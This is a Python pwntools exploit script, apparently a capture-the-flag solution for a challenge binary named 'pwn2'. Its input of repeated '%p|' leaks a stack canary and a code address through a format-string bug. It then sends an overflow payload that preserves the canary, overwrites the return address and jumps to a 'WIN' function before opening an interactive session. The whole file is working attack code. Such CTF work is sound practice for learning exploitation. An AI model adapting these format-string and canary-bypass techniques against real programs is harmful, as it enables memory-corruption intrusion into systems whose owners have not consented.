from pwn import *

p = process("./pwn2")
elf = ELF("./pwn2")

p.recvuntil(b"Enter the password of stage 1:\n")
p.sendline(b"CSCG{THIS_IS_TEST_FLAG}")

p.recvuntil(b"Enter your witch name:")
p.sendline(b"%p|"*41)

leaks = p.recvuntil("enter your magic spell:").decode().split("|")
MAIN = leaks[40]
canary = leaks[38]
mainOffset = 0xd8e

log.info(f"Main: {MAIN}")
log.info(f"Canary: {canary}")

WINOffset = 0x231#0xb94
WIN = int(MAIN,16) - WINOffset

WINRetOffset = 0x36
ret = WIN + WINRetOffset
# b94
log.info(f"WIN Address: {hex(WIN)}")

payload  = b"Expelliarmus\x00"
payload += b"A" * 251
payload += p64(int(canary,16))
log.info("Canary Sent")

payload += b"A" * 8
payload += p64(ret)
log.info(f"Ret Sent: '{p64(ret)}' - {hex(ret)}")
payload += p64(WIN)
log.info(f"WIN: {p64(WIN)} - {hex(WIN)}")

raw_input("gdb attach")

p.sendline(payload)

p.interactive()